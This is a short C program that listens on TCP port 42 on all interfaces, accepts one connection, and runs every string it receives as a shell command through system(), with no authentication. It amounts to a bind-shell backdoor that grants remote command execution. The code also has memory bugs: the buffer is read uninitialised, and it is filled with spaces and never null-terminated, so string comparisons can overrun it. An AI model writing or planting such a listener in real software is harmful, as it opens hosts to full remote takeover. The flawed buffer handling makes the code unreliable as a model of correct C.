#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define PORT 42

void blankOut(char string[]);

int main(){
	
	int thisSocket;
	struct sockaddr_in destination;

	destination.sin_family = AF_INET;
	thisSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
	if (thisSocket < 0)
	{
		printf("Socket Creation FAILED!\n");
		return 0;
	}
	printf("Socket Created!\n");
	
	destination.sin_port = htons (PORT);
	destination.sin_addr.s_addr = INADDR_ANY;
	if (bind(thisSocket, (struct sockaddr *)&destination, sizeof(destination))<0){
		printf("Binding Socket FAILED!\n");
		if (thisSocket) close(thisSocket);
		return 0;
	}
	printf("Socket Bound!\n");

	printf("Listening on %d...\n", PORT);
	if (listen(thisSocket, 5)<0){
		printf("Listening on Socket FAILED!\n");
		if (thisSocket) close(thisSocket);
		return 0;
	}
	
	struct sockaddr_in clientAddress;
	socklen_t clientSize = sizeof(clientAddress);
	thisSocket= accept(thisSocket, (struct sockaddr *)&clientAddress, &clientSize);
	if (thisSocket<0)
	{
		printf("Socket Connection FAILED!\n");
		if (thisSocket) close(thisSocket);
		return 0;
	}
	printf("Connection Established!\n");
	
	
	char buffer[101];
	while(strcmp(buffer,"end") != 0){
		int n;
		blankOut(buffer);
		n = read(thisSocket, buffer, 100);
		if(n < 0){
			printf("Reading from Socket FAILED!\n");
			if (thisSocket) close(thisSocket);
			return 0;
		}
		if(strcmp(buffer,"end") != 0){
			printf("Command Received: %s\n", buffer);
			system(buffer);
		}else{
			printf("Closing Program...\n");
		}
	}
	
	close(thisSocket);
	
	return 0;
}

void blankOut(char string[]){
	for(int i = 0; i <= 100; i++){
		string[i] = ' ';
	}
}
